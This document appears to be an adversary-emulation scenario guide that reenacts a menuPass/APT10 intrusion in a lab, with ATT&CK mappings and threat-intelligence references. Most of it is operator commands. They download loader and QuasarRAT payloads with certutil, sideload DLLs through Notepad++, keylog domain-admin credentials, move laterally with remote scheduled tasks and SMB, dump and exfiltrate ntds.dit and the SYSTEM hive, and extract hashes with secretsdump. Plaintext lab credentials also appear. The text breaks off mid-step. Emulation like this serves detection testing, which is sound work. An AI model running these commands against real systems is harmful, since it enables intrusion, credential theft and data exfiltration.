# menuPass Scenario Overview

## Step 0 - Operator Setup

### ☣️ Procedures

* Initiate an RDP session to the Windows jumpbox `homelander (116.83.1.29)`

* Search for Command Prompt and right-click Run As Administrator. Execute the
following command to start the Quasar C2 server:

  ```
  C:\menu_pass\Resources\Quasar\bin\Release\net472\Quasar.exe -c C:\menu_pass\Resources\Quasar\quasar.p12
  ```

* :arrow_right: Initiate an RDP session to the Kali attack host `kraken (176.59.1.18)`

* In a new terminal window, start the evalsC2server, ensuring the following
handlers are enabled:
  * QuasarRAT
  * SodaMaster
  * Simple file server

  ```
  cd menu_pass/Resources/control_server
  sudo go build -o controlServer main.go
  sudo ./controlServer -c config/msr2_handler_config.yml
  ```

* Right-click within the terminal window and click "Split Terminal Horizontally". Within the new terminal, change directory to the location of the evalsC2client.py and **use this terminal for tasking implants**.

  ```
  cd menu_pass/Resources/control_server
  ```

## Step 1 - Establish Persistence

### :microphone: Voice Track

menuPass gains initial access via stolen credentials with local administrative
privileges. These credentials allow the adversary to access the Microsoft
Internet Information Services (IIS) web server `gabumon (10.10.10.9)` in
Subsidiary A’s environment via RDP.

After establishing access on the IIS server `gabumon (10.10.10.9)`, menuPass
downloads Sigloader, its components, and the encrypted QuasarRAT module on the
victim device using `certutil`. SigLoader is a multi-layer loader that loads
and decrypts the target payload. Eventually, SigLoader will load the first
payload, FYAnti, in memory.

FYAnti decrypts the first embedded .NET module and executes the module using
the `CppHostCLR` technique to avoid dropping additional files to disk. When
executed, the first embedded .NET module then enumerates files to find the
QuasarRAT .NET module on disk, decrypts it, and then executes it.

QuasarRAT, which has been modified and heavily obfuscated, checks first for
internet connectivity then connects to the C2 server using a redirector at
`notepad-plusplus-updates[.]com (121.93.4.32)`.

### ☣️ Procedures

* From the Windows jumpbox `homelander (116.83.1.29)`, using the provided
stolen system credentials, RDP to the IIS Server `gabumon (10.10.10.9)`.

  | Username | Password |
  | -------- | -------- |
  | DIGIRUNAWAY\kizumi | ydJEeqNzN4Xqkd9h@ |

* Open Command Prompt with administrative privileges

* Execute `certutil` to download SigLoader and FYAnti components.

  ```
  certutil.exe -urlcache -f http://ten-cent.us/files/VERSION.dll "C:\Program Files\Notepad++\VERSION.dll"
  certutil.exe -urlcache -f http://ten-cent.us/files/skt.dll %SYSTEMROOT%\System32\skt.dll
  certutil.exe -urlcache -f http://ten-cent.us/files/mshtml.wpf.wfx %SYSTEMROOT%\Microsoft.NET\mshtml.wpf.wfx
  certutil.exe -urlcache -f http://ten-cent.us/files/ngen.old2.log %SYSTEMROOT%\Microsoft.NET\Framework64\v4.0.30319\ngen.old2.log
  ```

  * Note:
    * `VERSION.dll` is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_layer1.dll
    * `skt.dll` is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_layer2.dll
    * `mshtml.wpf.wfx` is a symbolic link to menu_pass/Resources/payloads/sigloader/IIS_fyanti.dll
    * `ngen.old2.log` is a symbolic link to menu_pass/Resources/payloads/sigloader/Client.exe.enc

* Execute NotePad++.exe to perform DLL sideloading. SigLoader will load
FYAnti and FYAnti will load QuasarRAT.

  ```
  "C:\Program Files\Notepad++\notepad++.exe"
  ```

  * **NOTE:** the current working directory should be `C:\Windows\System32`. This is where the Quasar `clientmanagement.log` will be dropped.

* Confirm C2 registration of QuasarRAT

* **Minimize** Notepad++ and close out of all other windows, then disconnect from the RDP session (do not sign out)

### :mag: Reference Code & Reporting

1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
1. <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage>
1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
1. <https://www.lac.co.jp/lacwatch/report/20201201_002363.html>

 <details>
   <summary>:link: Click to expand source code links table</summary>

   > :information_source: **NOTE:** Not all techniques listed in this table
   directly map to evaluation substeps

   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
   | ----------------- | ---------------- | ---------------- | ------------------- |
   | RDP to the IIS server | - | T1021.001 Remote Services: Remote Desktop Protocol | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)<br>[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)<br>[DOJ](https://www.justice.gov/archives/opa/page/file/1122671/download) |
   | Authenticate with IIS admin credentials | - | T1078.002 Valid Accounts: Domain Accounts | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)<br>[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)<br>[DOJ](https://www.justice.gov/archives/opa/page/file/1122671/download) |
   | Open cmd | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | Execute certutil to download Sigloader, FYAnti, and QuasarRAT components | - | T1105 Ingress Tool Transfer | [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage) |
   | Dropped files were modified to contain shellcode | [SigFlip documentation](../Resources/SigLoader/README.md#sigflip) | T1027.009 Obfuscated Files or Information: Embedded Payloads | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/) |
   | Dropped files' signatures are still valid | [SigFlip documentation](../Resources/SigLoader/README.md#sigflip) | T1553.002 Subvert Trust Controls: Code Signing | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20%E2%80%98vac.dll%E2%80%99%20DLL%20file%20is%20signed%20with%20a%20valid%2C%20legitimate%20digital%20signature%2C%20although%20the%20file%20has%20been%20tampered%20with.) |
   | Execute Notepad++.exe to perform DLL sideloading | - | T1574.002 Hijack Execution Flow: DLL Side-Loading | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/) |
   | SigLoader decrypts shellcode (combination of XOR/AES/DES) | [decrypt](../Resources/SigLoader/src/layer1_loader.cpp#L272) | T1140 Deobfuscate/Decode Files or Information | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20layer%20I%20loader%20decrypts%20the%20layer%20II%20loader%20shellcode%20from%20the%20embedded%20data)
   | SigLoader reflectively loads and executes FYAnti | [run_code](../Resources/SigLoader/src/layer1_loader.cpp#L75) | T1620 Reflective Code Loading | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=Ecipekac%20uses%20a%20new%2C%20complicated%20loading%20schema)
   | FYAnti contains an embedded .NET assembly | [embedded.hpp](../Resources/fyanti/src/native-loader/main.cpp#L7-L19)  | T1027.009 Obfuscated Files or Information: Embedded Payloads | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/) |
   | FYAnti reflectively loads and executes the QuasarRAT loader via CppHostClr | [execute_ssembly](../Resources/fyanti/src/native-loader/main.cpp#L36-L48) | T1620 Reflective Code Loading | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/) |
   | QuasarRAT loader is obfuscated using ConfuserEx | [ConfuserEx Settings](../Resources/fyanti/src/managed-loader/ConfuserSettings.crproj.in) | T1027.002 Obfuscated Files or Information: Software Packing | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | QuasarRAT loader decrypts QuasarRAT | [Decrypt](../Resources/fyanti/src/managed-loader/main.cs#L159) | T1140 Deobfuscate/Decode Files or Information | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor)<br>[Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/) |
   | QuasarRAT loader loads and executes QuasarRAT | [FindModule, Invoke](../Resources/fyanti/src/managed-loader/main.cs#L59-L70) | T1620 Reflective Code Loading | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/) |
   | QuasarRAT communicates over TCP | [Connect](../Resources/Quasar/Quasar.Client/Networking/Client.cs#L269) | T1095 Non-Application Layer Protocol | [Quasar Github](https://github.com/quasar/Quasar) |
   | QuasarRAT C2 communications use TLS | [SslStream](../Resources/Quasar/Quasar.Client/Networking/Client.cs#L283-L284) | T1573.002 Encrypted Channel: Asymmetric Cryptography | [Quasar Github](https://github.com/quasar/Quasar) |
   | QuasarRAT C2 communications are encrypted with symmetric encryption | [Connect](../Resources/Quasar/Quasar.Client/Networking/Client.cs#L283-L292) | T1573.001 Encrypted Channel: Symmetric Cryptography | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | QuasarRAT starts keylogging | [Keylogger](../Resources/Quasar/Quasar.Client/Logging/Keylogger.cs) | T1056.001 Input Capture: Keylogging | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |

 </details>

<br>

## Step 2 - Initial Discovery

### :microphone: Voice Track

After establishing communications with the C2 server, menuPass will use
QuasarRAT to execute scripted discovery actions and discover the presence of a
domain controller on Subsidiary A’s network.

### ☣️ Procedures

* Using QuasarRAT, download the PowerShell discovery script to the IIS Server

  ```
  ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\step2discovery.ps1", "transfer_dst": "C:\\Users\\kizumi\\AppData\\Local\\Temp\\ekR9TmrCQa1Q.ps1"}'
  ```

* Using QuasarRAT, execute the PowerShell discovery script

  ```
  ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 1, "proc_path":"powershell.exe", "proc_args": "\"C:\\Users\\kizumi\\AppData\\Local\\Temp\\ekR9TmrCQa1Q.ps1\""}'
  ```

### :mag: Reference Code & Reporting

1. <https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor>
1. <https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934>
1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
1. <https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt->
1. <https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10>

 <details>
   <summary>:link: Click to expand source code links table</summary>

   > :information_source: **NOTE:** Not all techniques listed in this table
   directly map to evaluation substeps

   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
   | ----------------- | ---------------- | ---------------- | ------------------- |
   | QuasarRAT execute commands | [ExecuteProcess](../Resources/Quasar/Quasar.Client/Messages/TaskManagerHandler.cs#L179) | T1106 Native API | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | QuasarRAT executes PowerShell discovery script | [ExecuteProcess](../Resources/Quasar/Quasar.Client/Messages/TaskManagerHandler.cs#L179) | T1059.001 Command and Scripting Interpreter: PowerShell | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)
   | PowerShell script executes ipconfig /all | [step2discovery.ps1](../Resources/payloads/quasar/step2discovery.ps1) | T1016 System Network Configuration Discovery | [Quasar Github](https://github.com/quasar/Quasar) |
   | PowerShell script executes nslookup | [step2discovery.ps1](../Resources/payloads/quasar/step2discovery.ps1) | T1016 System Network Configuration Discovery | [Quasar Github](https://github.com/quasar/Quasar) |

 </details>

<br>

## Step 3 - Credential Access and Privilege Escalation

### :microphone: Voice Track

Eventually, the IIS Server admin logs in to the IIS Server `gabumon (10.10.10.9)`.
While performing tasks, they eventually need to type in their Domain Admin
credentials. Using QuasarRAT's keylogger utility, menuPass captures the domain
admin credentials.

menuPass initiates a new RDP to the IIS server `gabumon (10.10.10.9)` using
the compromised credentials from Step 1.

Using the RDP to the IIS Server `gabumon (10.10.10.9)`, menuPass opens
PowerShell with administrative privileges and authenticates using the domain
admin's credentials.

### ☣️ Procedures

> :fast_forward: Emulate the following legitimate user activity:
>
> * :arrow_right: initiate an RDP session from the jumpbox `homelander (176.59.17.22)` to `gabumon (10.10.10.9)` as the IIS Admin:
>
>   | Username | Password |
>   | -------- | -------- |
>   | DIGIRUNAWAY\kizumi | ydJEeqNzN4Xqkd9h@ |
>
> * Open Command Prompt with administrative privileges, execute cmd via `runas` with their Domain Admin username, **typing the password when prompted**:
>
>    ```
>    runas /user:DIGIRUNAWAY\kizumi.da cmd
>    ```
>
>   * **Type, DO NOT copy and paste,** the following when prompted:
>
>       ```
>       ydJEeqNzN4Xqkd9h@
>       ```
>
> * Close the Command Prompts then **disconnect** from the RDP when finished. You should return to `homelander (116.83.1.29)`
>
> :fast_forward: Resume red team activity

* Using the first QuasarRAT on the IIS server `gabumon (10.10.10.9)`, retrieve
keylogs:

  ```
  ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 4}'
  ```

* Initiate a new RDP to the IIS server `gabumon (10.10.10.9)` using the
stolen credentials from Step 1.

  | Username | Password |
  | -------- | -------- |
  | DIGIRUNAWAY\kizumi | ydJEeqNzN4Xqkd9h@ |

* Within the RDP to the IIS server `gabumon (10.10.10.9)`, open Command Prompt
with administrative privileges (if not already open) then execute the following
runas command, entering the kizumi.da password when prompted:

  ```
  runas /netonly /user:DIGIRUNAWAY\kizumi.da cmd.exe
  ```

  | Password |
  | -------- |
  | ydJEeqNzN4Xqkd9h@ |

### :mag: Reference Code & Reporting

1. <https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor>
1. <https://medium.com/cycraft/supply-chain-attack-targeting-taiwan-financial-sector-bae2f0962934>
1. <https://web.archive.org/web/20191028183408/https://blog.ensilo.com/uncovering-new-activity-by-apt10>
1. <https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/>
1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>
1. <https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html>
1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
1. <https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt->

 <details>
   <summary>:link: Click to expand source code links table</summary>

   > :information_source: **NOTE:** Not all techniques listed in this table
   directly map to evaluation substeps

   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
   | ----------------- | ---------------- | ---------------- | ------------------- |
   | Keylog domain admin credentials | [Keylogger](../Resources/Quasar/Quasar.Client/Logging/Keylogger.cs) | T1056.001 Input Capture: Keylogging | [Quasar Github](https://github.com/quasar/Quasar) |
   | RDP to the IIS server | - | T1021.001 Remote Services: Remote Desktop Protocol | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)<br>[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)<br>[DOJ](https://www.justice.gov/archives/opa/page/file/1122671/download) |
   | Authenticate with IIS admin credentials | - | T1078.002 Valid Accounts: Domain Accounts | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)<br>[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)<br>[DOJ](https://www.justice.gov/archives/opa/page/file/1122671/download) |
   | Open Command Prompt | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | Authenticate with domain admin credentials | - | T1078.002 Valid Accounts: Domain Accounts | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)<br>[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)<br>[DOJ](https://www.justice.gov/archives/opa/page/file/1122671/download) |

 </details>

<br>

## Step 4 - Lateral Movement to Subsidiary A Domain Controller

### :microphone: Voice Track

Using the first QuasarRAT implant, menuPass downloads a second copy of
SigLoader/QuasarRAT to the IIS Server `gabumon (10.10.10.9)` then uses the
elevated Command Prompt to move the executable to the Subsidiary A Domain
Controller `parrotmon (10.10.10.4)`.

Using the elevated Command Prompt, menuPass uses the `schtasks` utility to
remotely create and run a scheduled task on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)` that executes a legitimate executable:
`Notepad++.exe`.

This legitimate executable executes SigLoader via DLL side-loading and results
in a second QuasarRAT implant on the Subsidiary A Domain Controller `parrotmon (10.10.10.4)`.
This second QuasarRAT implant will connect to the C2 server using a redirector at `notepad-plusplus-updates[.]eu (121.93.99.100)`.

### ☣️ Procedures

* Using the QuasarRAT on the IIS Server `gabumon (10.10.10.9)`, download a second copy of
SigLoader/QuasarRAT components. **Wait until each command has returned before executing the next**.
  * SigLoader layer 1

    ```
    ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\DC_layer1.dll", "transfer_dst": "C:\\Users\\kizumi\\AppData\\Local\\Temp\\VERSION.dll"}'
    ```

  * SigLoader layer 2

    ```
    ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\DC_layer2.dll", "transfer_dst": "C:\\Users\\kizumi\\AppData\\Local\\Temp\\nhi.dll"}'
    ```

  * FYAnti

    ```
    ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\DC_fyanti.dll", "transfer_dst": "C:\\Users\\kizumi\\AppData\\Local\\Temp\\mshtmled.wpf.cfg"}'
    ```

  * QuasarRAT

    ```
    ./evalsC2client.py --set-task F5B06FACBDB06686ABA3E958BE433EF5 '{"type": 2, "transfer_src": "C:\\menu_pass\\Resources\\payloads\\quasar\\Client.exe.enc", "transfer_dst": "C:\\Users\\kizumi\\AppData\\Local\\Temp\\ngen.old3.log"}'
    ```

* Return to the elevated Command Prompt on the IIS server `gabumon (10.10.10.9)`
and move the downloaded components to the Subsidiary A Domain Controller via
SMB.

  ```
  move C:\Users\kizumi\AppData\Local\Temp\VERSION.dll "\\10.10.10.4\C$\Program Files\Notepad++\"
  move C:\Users\kizumi\AppData\Local\Temp\nhi.dll \\10.10.10.4\admin$\System32
  move C:\Users\kizumi\AppData\Local\Temp\mshtmled.wpf.cfg \\10.10.10.4\admin$\Microsoft.NET
  move C:\Users\kizumi\AppData\Local\Temp\ngen.old3.log \\10.10.10.4\admin$\Microsoft.NET\Framework64\v4.0.30319\
  ```

* Using the elevated Command Prompt on the IIS server `gabumon (10.10.10.9)`,
remotely create a scheduled task on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)` to execute a legitimate executable that sideloads
SigLoader.

  ```
  schtasks /create /s 10.10.10.4 /u DIGIRUNAWAY\kizumi.da /p ydJEeqNzN4Xqkd9h@ /tn "Notepad++ Script" /tr "\"C:\Program Files\Notepad++\notepad++.exe\"" /ru DIGIRUNAWAY\kizumi.da /rp ydJEeqNzN4Xqkd9h@ /rl HIGHEST /sc MINUTE /mo 15 /f
  ```

* Using the elevated Command Prompt on the IIS server `gabumon (10.10.10.9)`,
remotely run the scheduled task created on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`.

  ```
  schtasks /run /s 10.10.10.4 /u DIGIRUNAWAY\kizumi.da /p ydJEeqNzN4Xqkd9h@ /tn "Notepad++ Script"
  ```

* Confirm C2 registration of a second QuasarRAT implant.

### :mag: Reference Code & Reporting

1. <http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf>
1. <https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf>
1. <https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf>

 <details>
   <summary>:link: Click to expand source code links table</summary>

   > :information_source: **NOTE:** Not all techniques listed in this table
   directly map to evaluation substeps

   | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
   | ----------------- | ---------------- | ---------------- | ------------------- |
   | Download 2nd SigLoader/QuasarRAT (non-keylogging) | [Execute File Download](../Resources/Quasar/Quasar.Client/Messages/FileManagerHandler.cs#L334) | T1105 Ingress Tool Transfer | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | Use elevated Command Prompt | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | Create scheduled task | - | T1603 Scheduled Task/Job | [Kaspersky](https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf#page=30) |
   | Run scheduled task | - | T1603 Scheduled Task/Job | [Kaspersky](https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf#page=30) |
   | Dropped files were modified to contain shellcode | [SigFlip documentation](../Resources/SigLoader/README.md#sigflip) | T1027.009 Obfuscated Files or Information: Embedded Payloads | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/)
   | Dropped files' signatures are still valid | [SigFlip documentation](../Resources/SigLoader/README.md#sigflip) | T1553.002 Subvert Trust Controls: Code Signing | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20%E2%80%98vac.dll%E2%80%99%20DLL%20file%20is%20signed%20with%20a%20valid%2C%20legitimate%20digital%20signature%2C%20although%20the%20file%20has%20been%20tampered%20with.)
   | Execute Notepad++.exe to perform DLL sideloading | - | T1574.002 Hijack Execution Flow: DLL Side-Loading | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20layer%20I%20loader%20decrypts%20the%20layer%20II%20loader%20shellcode%20from%20the%20embedded%20data)
   | SigLoader decrypts shellcode (combination of XOR/AES/DES) | [decrypt](../Resources/SigLoader/src/layer1_loader.cpp#L272) | T1140 Deobfuscate/Decode Files or Information | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20layer%20I%20loader%20decrypts%20the%20layer%20II%20loader%20shellcode%20from%20the%20embedded%20data)
   | SigLoader reflectively loads and executes FYAnti | [run_code](../Resources/SigLoader/src/layer1_loader.cpp#L75) | T1620 Reflective Code Loading | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=other%20SodaMaster%20samples.-,FYAnti%20loader%20for%20QuasarRAT,-The%20last%20observed)
   | FYAnti contains an embedded .NET assembly | [embedded.hpp](../Resources/fyanti/src/native-loader/main.cpp#L7-L19)  | T1027.009 Obfuscated Files or Information: Embedded Payloads | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/) |
   | FYAnti reflectively loads and executes the QuasarRAT loader via CppHostClr | [execute_ssembly](../Resources/fyanti/src/native-loader/main.cpp#L36-L48) | T1620 Reflective Code Loading | [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/) |
   | QuasarRAT loader is obfuscated using ConfuserEx | [ConfuserEx Settings](../Resources/fyanti/src/managed-loader/ConfuserSettings.crproj.in) | T1027.002 Obfuscated Files or Information: Software Packing | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |
   | QuasarRAT loader decrypts QuasarRAT | [Decrypt](../Resources/fyanti/src/managed-loader/main.cs#L159) | T1140 Deobfuscate/Decode Files or Information | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/) |
   | QuasarRAT loader loads and executes QuasarRAT | [FindModule, Invoke](../Resources/fyanti/src/managed-loader/main.cs#L59-L70) | T1620 Reflective Code Loading | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) [Kaspersky](https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/) |
   | QuasarRAT communicates over TCP | [Connect](../Resources/Quasar/Quasar.Client/Networking/Client.cs#L269) | T1095 Non-Application Layer Protocol | [Quasar Github](https://github.com/quasar/Quasar) |
   | QuasarRAT C2 communications use TLS | [SslStream](../Resources/Quasar/Quasar.Client/Networking/Client.cs#L283-L284) | T1573.002 Encrypted Channel: Asymmetric Cryptography | [Quasar Github](https://github.com/quasar/Quasar) |
   | QuasarRAT C2 communications are encrypted with symmetric encryption | [Connect](../Resources/Quasar/Quasar.Client/Networking/Client.cs#L283-L292) | T1573.001 Encrypted Channel: Symmetric Cryptography | [BlackBerry](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor) |

 </details>

<br>

## Step 5 - Credential Access and Discovery

### :microphone: Voice Track

After gaining access on the Subsidiary A Domain Controller `parrotmon (10.10.10.4)`,
menuPass uses the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)` to execute the native `ntdsutil.exe` utility to export
the Active Directory database to `ntds.dit`. Then, menuPass uses QuasarRAT to
exfiltrate the generated `ntds.dit` and `SYSTEM` hive files then dumps
credentials offline to retrieve hashes of authenticated users. These hashes are
cracked offline to retrieve plaintext passwords for the domain users.

menuPass then performs an internal port scan to search for open RDP and SMB
ports on the network. A reverse nslookup is then performed against the active
IP addresses to resolve the hostnames.

### ☣️ Procedures

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, execute `whoami` to get the user SID of kizumi.da

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"whoami.exe", "proc_args": "/all"}'
  ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, create folder `$RCXNYCG` in kizumi.da's
Recycle Bin (`C:\$Recycle.Bin\S-1-5-21-156812349-472333277-3174882868-1109\$RCXNYCG`).

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"cmd.exe", "proc_args": "/c mkdir C:\\$Recycle.Bin\\S-1-5-21-156812349-472333277-3174882868-1109\\$RCXNYCG"}'
  ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, execute `ntdsutil.exe` to generate `ntds.dit`.

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 1, "proc_path":"ntdsutil.exe", "proc_args": "\"ac i ntds\" \"i\" \"c f C:\\$Recycle.Bin\\S-1-5-21-156812349-472333277-3174882868-1109\\$RCXNYCG\" q q"}'
  ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, exfiltrate the generated `ntds.dit` file.

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 3, "transfer_src": "C:\\$Recycle.Bin\\S-1-5-21-156812349-472333277-3174882868-1109\\$RCXNYCG\\Active Directory\\ntds.dit", "transfer_dst": "ntds.dit"}'
  ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
`parrotmon (10.10.10.4)`, exfiltrate the generated `SYSTEM` file

  ```
  ./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{"type": 3, "transfer_src": "C:\\$Recycle.Bin\\S-1-5-21-156812349-472333277-3174882868-1109\\$RCXNYCG\\registry\\SYSTEM", "transfer_dst": "SYSTEM"}'
  ```

* Using impacket, locally dump credentials to retrieve hashes of authenticated users, validate the NTLM hash of kizumi.da is contained in the output:

  ```
  impacket-secretsdump -system files/SYSTEM -ntds files/ntds.dit local | grep 6265fbabbdaa3ee71df61bd9f3c77d68
  ```

* Using the QuasarRAT implant on the Subsidiary A Domain Controller
